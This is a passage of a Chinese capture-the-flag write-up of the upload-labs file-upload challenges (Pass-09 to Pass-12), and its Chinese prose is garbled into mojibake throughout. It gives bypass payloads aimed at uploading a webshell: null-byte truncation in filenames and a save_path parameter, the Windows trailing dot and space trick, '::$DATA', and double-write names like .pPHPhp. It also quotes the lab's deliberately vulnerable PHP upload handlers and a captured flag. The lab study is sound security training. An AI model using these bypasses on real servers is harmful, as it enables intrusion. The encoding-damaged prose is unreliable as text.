<code>$_FILES['upload_file']['tmp_name']</code></h5><ul><li><strong>å«ä¹‰</strong>ï¼šè¿™æ˜¯ä¸Šä¼ æ–‡ä»¶åœ¨æœåŠ¡å™¨ä¸Šçš„ä¸´æ—¶å­˜å‚¨è·¯å¾„ã€‚</li><li><strong>ä½œç”¨</strong>ï¼šå½“æ–‡ä»¶è¢«ä¸Šä¼ åˆ°æœåŠ¡å™¨æ—¶ï¼ŒPHP ä¼šå°†æ–‡ä»¶å­˜å‚¨åœ¨ä¸€ä¸ªä¸´æ—¶ç›®å½•ä¸­ï¼Œå¹¶ä¸ºè¯¥æ–‡ä»¶åˆ†é…ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶åã€‚<code>tmp_name</code> å°±æ˜¯è¿™ä¸ªä¸´æ—¶æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ã€‚</li><li><strong>ç”¨é€”</strong>ï¼šåœ¨å¤„ç†æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œä½ éœ€è¦ä½¿ç”¨ <code>tmp_name</code> æ¥ç§»åŠ¨æ–‡ä»¶åˆ°æŒ‡å®šçš„ç›®å½•ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ <code>move_uploaded_file()</code> å‡½æ•°å°†æ–‡ä»¶ä»ä¸´æ—¶ç›®å½•ç§»åŠ¨åˆ°ç›®æ ‡ç›®å½•ã€‚</li></ul><h5 id="2-FILES-upload-file-name"><a href="#2-FILES-upload-file-name" class="headerlink" title="2. $_FILES['upload_file']['name']"></a>2. <code>$_FILES['upload_file']['name']</code></h5><ul><li><strong>å«ä¹‰</strong>ï¼šè¿™æ˜¯ä¸Šä¼ æ–‡ä»¶åœ¨å®¢æˆ·ç«¯çš„åŸå§‹æ–‡ä»¶åã€‚</li><li><strong>ä½œç”¨</strong>ï¼šå®ƒè¡¨ç¤ºç”¨æˆ·åœ¨å®¢æˆ·ç«¯é€‰æ‹©çš„æ–‡ä»¶çš„åç§°ï¼ŒåŒ…æ‹¬æ–‡ä»¶æ‰©å±•åã€‚</li><li><strong>ç”¨é€”</strong>ï¼šé€šå¸¸ç”¨äºç¡®å®šæ–‡ä»¶çš„åç§°å’Œæ‰©å±•åï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªå€¼æ˜¯ç”±å®¢æˆ·ç«¯æä¾›çš„ï¼Œå› æ­¤ä¸èƒ½å®Œå…¨ä¿¡ä»»ã€‚åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œåº”è¯¥å¯¹æ–‡ä»¶åè¿›è¡Œè¿‡æ»¤å’ŒéªŒè¯ï¼Œä»¥é¿å…å®‰å…¨é—®é¢˜ï¼ˆä¾‹å¦‚è·¯å¾„æ³¨å…¥æˆ–æ¶æ„æ–‡ä»¶åï¼‰ã€‚</li></ul></blockquote><p>å…¶å®è¿˜æ˜¯ç”¨çš„é»‘åå•çš„æ£€æµ‹é€»è¾‘ï¼š</p><p>1ï¼‰æ„å»ºä¸€ä¸ªé»‘åå• </p><p>2ï¼‰è·å–æ–‡ä»¶å</p><p>3ï¼‰åˆ é™¤æ–‡ä»¶ç»“å°¾çš„. ã€è½¬åŒ–ä¸ºå°å†™ ã€è¿‡æ»¤::$DATAã€åç¼€åtrim</p><p>å¦‚æœèƒ½ç»•è¿‡åç¼€åæ£€æµ‹ï¼Œæ–‡ä»¶çš„è·¯å¾„æ˜¯<code>UPLOAD_PATH.'/'.$file_name;</code>æ‹¼æ¥å¾—æ¥çš„ï¼Œæ˜¯å¦å¯ä»¥å°è¯•ç©ºå­—èŠ‚æˆªæ–­ï¼Ÿ</p><p>å¦‚æœ<code>xxx.php%00.jpg</code>ï¼Œåé¢çš„.jpgèƒ½ç»•è¿‡åç¼€åæ£€æµ‹ï¼Œmove_uploaded_fileå¦‚æœå­˜åœ¨ç¢°åˆ°ç©ºå­—èŠ‚å°±ç»ˆæ­¢æ‰§è¡Œçš„é—®é¢˜ï¼Œé‚£ä¹ˆæœ€åå°±ä¼šä¿å­˜æˆ<code>xxx.php</code></p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2011.33.17.png" style="zoom:50%;"><p>ç›´æ¥ç”¨urlç¼–ç çš„%00è²Œä¼¼ä¸è¡Œï¼Ÿ</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2011.34.42.png" style="zoom:50%;"><p>ç”Ÿæˆç©ºå­—èŠ‚è²Œä¼¼ä¹Ÿä¸è¡Œã€‚</p><ul><li>è¿™ä¸€å…³åˆæ˜¯windwosä¸“å±ï¼Œç”¨åˆ°çš„è¿˜æ˜¯Pass-06çš„çŸ¥è¯†ç‚¹</li></ul><p>åœ¨windowsä¸‹ï¼Œå¦‚æœæ–°å»ºæ–‡ä»¶<code>123.php.ç©ºæ ¼ </code>ï¼Œå®é™…ä¼šè¢«å­˜å‚¨ä¸º<code>123.php</code>ã€‚ä¸Pass-06ä¸åŒçš„æ˜¯ï¼ŒPass-06å¯¹æ–‡ä»¶åè¿›è¡Œäº†é‡å‘½åï¼Œå¹¶ä¸”æ‹¼æ¥çš„åç¼€æ˜¯<code> $file_ext</code>ï¼Œè€Œæœ¬å…³æ‹¼æ¥çš„æ˜¯<code>$temp_file</code>ã€‚å¦‚æœæƒ³å®ç°Pass-6çš„<code>.phpç©ºæ ¼</code>çš„æ•ˆæœï¼Œé‚£ä¹ˆ<code>$temp_file</code>åœ¨ç»è¿‡å»é™¤ç»“å°¾çš„â€.â€å¤„ç†ä¹‹å‰åº”è¯¥æ˜¯<code>.php.ç©ºæ ¼.</code>ï¼Œè¿™æ ·ä¹Ÿå°±åæ¨å‡ºpaylaodäº†ã€‚</p><p>å¤„ç†é€»è¾‘ï¼šå…ˆåˆ é™¤æœ«å°¾çš„â€.â€ï¼Œç„¶åè·å–çš„åç¼€åæ˜¯â€.ç©ºæ ¼â€ï¼Œè‡ªç„¶èƒ½ç»•è¿‡é»‘åå•ã€‚åˆ é™¤ä¹‹åçš„æ–‡ä»¶åä¸º<code>yjh.php.ç©ºæ ¼</code>ï¼Œåœ¨windwosä¸Šä¼šè‡ªåŠ¨åˆ é™¤ç©ºæ ¼ï¼Œå˜æˆ<code>yjh.php.</code>ï¼Œèƒ½å¤Ÿè¢«è§£ææ‰§è¡Œã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2011.40.25.png" style="zoom:50%;"><p>ä½†æ˜¯ï¼ŒåŒç†ï¼Œåœ¨linuxä¸‹æ˜¯æ— æ³•å®ç°è§£æçš„ï¼Œlinuxä¸‹æ–‡ä»¶åä¸ä¼šè‡ªåŠ¨åˆ é™¤æœ€åçš„ç©ºæ ¼ã€‚</p><h1 id="åã€Pass-10ï¼ˆåç¼€åé»‘åå•è¿‡æ»¤-åµŒå¥—åŒå†™ç»•è¿‡ï¼‰"><a href="#åã€Pass-10ï¼ˆåç¼€åé»‘åå•è¿‡æ»¤-åµŒå¥—åŒå†™ç»•è¿‡ï¼‰" class="headerlink" title="åã€Pass-10ï¼ˆåç¼€åé»‘åå•è¿‡æ»¤-åµŒå¥—åŒå†™ç»•è¿‡ï¼‰"></a>åã€Pass-10ï¼ˆåç¼€åé»‘åå•è¿‡æ»¤-åµŒå¥—åŒå†™ç»•è¿‡ï¼‰</h1><h2 id="10-1-é¢˜é¢"><a href="#10-1-é¢˜é¢" class="headerlink" title="10.1 é¢˜é¢"></a>10.1 é¢˜é¢</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2013.42.45.png" style="zoom:50%;"><p>ä¾ç„¶è€æ ·å­ã€‚</p><h2 id="10-2-è§£é¢˜"><a href="#10-2-è§£é¢˜" class="headerlink" title="10.2 è§£é¢˜"></a>10.2 è§£é¢˜</h2><ul><li>ä¸Šä¼ yah.phpæŠ“åŒ…</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2013.48.17.png" style="zoom:50%;"><p>ä»€ä¹ˆæƒ…å†µï¼Œåç¼€åè¢«åƒäº†ï¼Œä¼°è®¡æ˜¯æŒ‰ç…§é»‘åå•è¿‡æ»¤åç¼€ã€‚å¯ä»¥é»‘ç›’æ¢æµ‹ä¸€ä¸‹ä»€ä¹ˆåŸå› ã€‚</p><ul><li>.jpgä¸Šä¼ æˆåŠŸ=&gt;æ²¡æ£€æµ‹MIMEç±»å‹&amp;&amp;æ²¡æœ‰æ£€æµ‹æ–‡ä»¶å¤´</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2013.49.46.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2013.51.35.png" style="zoom:50%;"><p>æ–‡ä»¶ä¸Šä¼ ä¹‹åæ–‡ä»¶åæ²¡æœ‰è½¬å°å†™ï¼Œæ–‡ä»¶åä¹Ÿæ²¡æœ‰é‡å‘½åã€‚</p><ul><li>å°è¯•åŒå†™ç»•è¿‡</li></ul><p><code>.PHphpP</code></p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2013.54.39.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°åç¼€åè¢«è¿‡æ»¤æ‰äº†ï¼Œæœ‰æ²¡æœ‰è¿›è¡Œé€’å½’è¿‡æ»¤å‘¢ï¼Ÿ</p><p><code>.PphpHP</code> å’Œ <code>.pPHPhp</code></p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2013.56.14.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2013.56.52.png" style="zoom:50%;"><p>çœ‹æ¥å°±è¿‡æ»¤äº†ä¸€æ¬¡ï¼Œæ£€æµ‹åˆ°phpå°±æ›¿æ¢ä¸ºäº†ç©ºï¼Œä½†æ˜¯å‰©ä¸‹çš„å­—ç¬¦åˆæ‹¼æ¥æˆäº†ä¸€ä¸ªphpã€‚</p><p><code>.phpphp</code>æ™®é€šçš„åŒå†™æ˜¯æ— æ³•ç»•è¿‡çš„ï¼Œä¸¤ä¸ªphpç›´æ¥ä¼šè¢«åŒæ—¶æ›¿æ¢æ‰ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2014.03.12.png" style="zoom:50%;"><ul><li>getshell</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2013.59.58.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2014.00.28.png" style="zoom:50%;"><ul><li><p>flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>5b9a8e16-6540-4951-8425-de794ccafca8<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h2 id="10-3-ä»£ç å®¡è®¡"><a href="#10-3-ä»£ç å®¡è®¡" class="headerlink" title="10.3 ä»£ç å®¡è®¡"></a>10.3 ä»£ç å®¡è®¡</h2><ul><li>æç¤º</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2014.01.39.png" style="zoom:50%;"><p>æç¤ºè¯´ä¼šä»æ–‡ä»¶åä¸­å»é™¤æ•æ„Ÿåç¼€ã€‚</p><ul><li>ä»£ç </li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$deny_ext</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>æ ¸å¿ƒå°±æ˜¯åŒ¹é…è¿‡æ»¤ï¼š</p><p><code>$file_name = str_ireplace($deny_ext,"", $file_name);</code></p></blockquote><p>ä½†è¿™ç§æ–¹å¼é€šå¸¸ä¸ä¼šç”¨é€’å½’çš„å½¢å¼è¿›è¡ŒäºŒæ¬¡è¿‡æ»¤ï¼Œå¯¼è‡´å­˜é‡å­—ç¬¦èƒ½ç»§ç»­æ„æˆæ•æ„Ÿå­—ç¬¦ä¸²ï¼š<code>.pPHPhp</code>-&gt;è¿‡æ»¤PHP-&gt;<code>.php</code>ã€‚</p><h1 id="åä¸€ã€Pass-11ï¼ˆåç¼€åç™½åå•-ä¸Šä¼ è·¯å¾„GETå¯æ§-00æˆªæ–­ï¼‰"><a href="#åä¸€ã€Pass-11ï¼ˆåç¼€åç™½åå•-ä¸Šä¼ è·¯å¾„GETå¯æ§-00æˆªæ–­ï¼‰" class="headerlink" title="åä¸€ã€Pass-11ï¼ˆåç¼€åç™½åå•+ä¸Šä¼ è·¯å¾„GETå¯æ§-00æˆªæ–­ï¼‰"></a>åä¸€ã€Pass-11ï¼ˆåç¼€åç™½åå•+ä¸Šä¼ è·¯å¾„GETå¯æ§-00æˆªæ–­ï¼‰</h1><h2 id="11-1-é¢˜é¢"><a href="#11-1-é¢˜é¢" class="headerlink" title="11.1 é¢˜é¢"></a>11.1 é¢˜é¢</h2><p>è·Ÿä¹‹å‰ä¸€æ ·ã€‚</p><h2 id="11-2-è§£é¢˜"><a href="#11-2-è§£é¢˜" class="headerlink" title="11.2 è§£é¢˜"></a>11.2 è§£é¢˜</h2><ul><li>ä¸Šä¼ yah.phpæŠ“åŒ…</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2014.11.29.png" style="zoom:50%;"><ul><li>å•æ”¹æ–‡ä»¶åä¸º.jpg</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2014.12.14.png" style="zoom:50%;"><p>æˆåŠŸä¸Šä¼ å•Š=&gt;æ²¡æœ‰æ£€æµ‹æ–‡ä»¶å¤´&amp;&amp;æ²¡æœ‰æ£€æµ‹MIME</p><p>æ–‡ä»¶åé‡å‘½åã€‚</p><p>ç¦æ­¢äº†å¤§å†™æ–‡ä»¶åï¼Œåˆ¤æ–­å¯èƒ½æ˜¯åšäº†ç™½åå•ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2014.13.52.png" style="zoom:50%;"><ul><li><code>1.phpç©ºæ ¼</code>ã€<code>1.php.</code>ã€<code>1.php.ç©ºæ ¼.</code>ã€<code>1.php::$DATA</code></li></ul><p>å‡æ— æ³•ç»•è¿‡ã€‚</p><ul><li>æç¤º</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2014.17.28.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2014.18.34.png" style="zoom:50%;"><p>ä»”ç»†çœ‹æŠ“åŒ…çš„åŒ…å¤´æœ‰ä¸ªè·¯å¾„å‚æ•°ï¼Œä¼°è®¡å°±æ˜¯å­˜æ”¾æ–‡ä»¶çš„è·¯å¾„ã€‚</p><p>å¦‚æœå°†è·¯å¾„æ”¹æˆ<code>../upload/yjh.php</code>ï¼Œæ–‡ä»¶åæ˜¯<code>yjh.jpg</code>ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2014.20.44.png" style="zoom:50%;"><p>æç¤ºä¸Šä¼ å‡ºé”™ã€‚æ³¨æ„ï¼Œæ²¡æœ‰æç¤º<code>åªå…è®¸ä¸Šä¼ ...</code>ï¼Œè¯´æ˜ç¬¬ä¸€å±‚æ£€æµ‹åç¼€çš„é€»è¾‘æ˜¯çªç ´äº†ã€‚</p><p>ç”¨ä¸Š00æˆªæ–­è¯•è¯•ã€‚</p><p><code>../upload/yjh.php%00</code></p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2014.22.36.png" style="zoom:50%;"><p>è¿˜æ˜¯ä¸Šä¼ å‡ºé”™ã€‚</p><ul><li>çœ‹ä¸‹ä»£ç ï¼š</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_path'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ©ç”¨ç™½åå•æ¥æ£€æµ‹åç¼€ï¼Œå¦‚æœæ–‡ä»¶åå­˜åœ¨â€.â€ï¼Œå¹¶ä¸”â€.â€åé¢çš„å†…å®¹ä¸æ˜¯jpgã€pngã€gifå°±ä¸è®©ä¸Šä¼ ï¼Œé™åˆ¶ç¡®å®å¾ˆä¸¥æ ¼ï¼Œæ²¡åŠæ³•ç”¨ä¸€èˆ¬çš„ä¿®æ”¹åç¼€çš„æ–¹æ³•ç»•è¿‡ã€‚</p><p>ä½†æ˜¯æ–‡ä»¶è·¯å¾„çš„æ‹¼æ¥å‚æ•°ä¸­<code>$_GET['save_path']</code>æ˜¯å¯æ§çš„ã€‚</p><p>å¦‚æœï¼š</p><p>save_path:<code>../upload/yjh.php%00</code></p><p>filename:<code>1.jpg</code></p><p>é‚£ä¹ˆï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$img_path</span><span class="token operator">=</span><span class="token punctuation">..</span>/upload/yjh.php%00/2134311423131.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½†æ˜¯<code>move_uploaded_file</code>å‡½æ•°åœ¨ç§»åŠ¨æ–‡ä»¶çš„æ—¶å€™ï¼Œç¢°åˆ°%00ï¼ˆå¯¹åº”ç©ºå­—èŠ‚ï¼‰,åé¢å°±ä¸å¤„ç†äº†ï¼Œæ‰€ä»¥å®é™…ä¸Š$img_pathåº”è¯¥æ˜¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$img_path</span><span class="token operator">=</span><span class="token punctuation">..</span>/upload/yjh.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¾¾åˆ°äº†ä¸Šä¼ webshellçš„ç›®çš„ã€‚</p><p>æ€è·¯æ²¡é—®é¢˜ï¼Œä½†æ˜¯åœ¨ç›®æ ‡ç¯å¢ƒä¸­éªŒè¯å¤±è´¥ï¼Œå¯èƒ½æ˜¯PHPç‰ˆæœ¬å’Œé…ç½®çš„åŸå› ã€‚</p><ul><li>å®ç°è¦æ±‚</li></ul><ol><li>phpç‰ˆæœ¬è¦å°äº5.3.4</li><li>php.iniä¸­çš„é…ç½®<code>magic_quotes_gpc=OFF</code></li></ol><h1 id="åäºŒã€Pass-12ï¼ˆåç¼€åç™½åå•-ä¸Šä¼ è·¯å¾„POSTå¯æ§-00æˆªæ–­ï¼‰"><a href="#åäºŒã€Pass-12ï¼ˆåç¼€åç™½åå•-ä¸Šä¼ è·¯å¾„POSTå¯æ§-00æˆªæ–­ï¼‰" class="headerlink" title="åäºŒã€Pass-12ï¼ˆåç¼€åç™½åå•+ä¸Šä¼ è·¯å¾„POSTå¯æ§-00æˆªæ–­ï¼‰"></a>åäºŒã€Pass-12ï¼ˆåç¼€åç™½åå•+ä¸Šä¼ è·¯å¾„POSTå¯æ§-00æˆªæ–­ï¼‰</h1><h2 id="12-1-é¢˜é¢"><a href="#12-1-é¢˜é¢" class="headerlink" title="12.1 é¢˜é¢"></a>12.1 é¢˜é¢</h2><p>è·Ÿä¹‹å‰ä¸€æ 